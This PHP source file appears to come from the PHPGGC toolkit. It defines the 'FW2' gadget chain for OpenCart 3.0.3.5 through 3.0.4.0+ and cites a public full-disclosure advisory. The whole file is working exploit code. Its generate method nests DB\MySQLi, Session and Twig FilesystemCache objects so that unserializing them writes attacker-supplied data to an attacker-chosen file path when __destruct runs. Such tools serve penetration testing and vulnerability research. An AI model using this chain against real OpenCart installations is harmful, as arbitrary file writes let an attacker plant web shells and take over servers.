<?php

namespace GadgetChain\OpenCart;

class FW2 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '3.0.3.5 <= 3.0.4.0+';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = 'The gadget chain is documented here: https://seclists.org/fulldisclosure/2022/May/30';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        return new \DB\MySQLi(
            new \Session(
                new \Twig\Cache\FilesystemCache(),
                $path,
                $data
            )
        );
    }
}
